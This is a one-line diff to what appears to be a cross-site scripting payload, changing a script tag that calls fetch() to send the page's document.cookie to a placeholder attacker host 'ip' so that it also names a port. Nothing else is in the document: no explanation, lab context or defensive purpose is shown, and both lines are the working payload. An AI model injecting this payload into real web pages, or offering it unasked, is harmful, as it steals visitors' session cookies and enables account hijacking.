@@ -1,1 +1,1 @@
-<script>fetch("http://ip/cookie="+document.cookie);</script>
+<script>fetch("http://ip:port/cookie="+document.cookie);</script>
